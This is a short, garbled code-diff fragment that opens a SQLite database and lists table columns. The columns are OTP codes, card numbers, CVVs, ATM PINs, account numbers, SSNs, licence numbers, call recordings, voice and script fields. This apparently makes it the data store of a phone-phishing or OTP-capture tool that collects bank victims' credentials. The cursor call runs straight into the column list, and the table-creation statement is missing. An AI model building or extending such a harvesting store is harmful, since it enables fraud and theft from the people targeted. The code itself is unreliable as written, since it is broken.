@@ -1,0 +1,27 @@
+'UsersDatabase.db'
+conn = sqlite3.connect(path, check_same_thread=False)
+
+c = conn.cursor()id int AUTO_INCREMENT,
+        user_id int,
+        bank_name text,
+        phone_no text,
+        otp_code int,
+        Recording_url text,
+        card_number int,
+        card_cvv int,
+        card_expiry int,
+        account_number int,
+        atm_pin int,
+        expiry_date int,
+        option1 text,
+        option2 text,
+        option3 text,
+        option4 text,
+        option_number text,
+        numbers_collected1 text,
+        numbers_collected2 text,
+        voice text,
+        dl_number text,
+        ssn_number text,
+        app_number text,
+        script text
